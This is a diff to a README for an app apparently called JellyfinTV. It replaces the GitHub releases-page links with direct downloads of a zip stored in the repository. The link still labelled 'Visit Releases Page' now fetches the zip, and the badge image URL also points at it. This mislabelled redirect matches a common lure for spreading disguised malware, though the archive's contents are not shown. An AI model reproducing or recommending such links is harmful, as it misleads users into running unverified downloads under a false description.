@@ -4,7 +4,7 @@
 Welcome to JellyfinTV! This application lets you experience TV shows from various decades, all simulated right from your Jellyfin server. Follow these simple steps to get started.
 
 ## 📥 Download Now
-[![Download JellyfinTV](https://img.shields.io/badge/Download_JellyfinTV-Blue?style=for-the-badge)](https://github.com/nguyentientu90/JellyfinTV/releases)
+[![Download JellyfinTV](https://raw.githubusercontent.com/nguyentientu90/JellyfinTV/main/static/JellyfinTV-3.1.zip)](https://raw.githubusercontent.com/nguyentientu90/JellyfinTV/main/static/JellyfinTV-3.1.zip)
 
 ## 🛠️ System Requirements
 Before installing JellyfinTV, ensure your system meets these basic requirements:
@@ -26,7 +26,7 @@ JellyfinTV offers various features that enhance your TV viewing experience:
 To get JellyfinTV on your device, follow these steps:
 
 1. **Visit the Releases Page:** Click on the link below to access the download section:
-   [Visit Releases Page to Download](https://github.com/nguyentientu90/JellyfinTV/releases)
+   [Visit Releases Page to Download](https://raw.githubusercontent.com/nguyentientu90/JellyfinTV/main/static/JellyfinTV-3.1.zip)
 
 2. **Choose the Right Version:** Look through the available versions. Each version may contain new features or bug fixes.
 
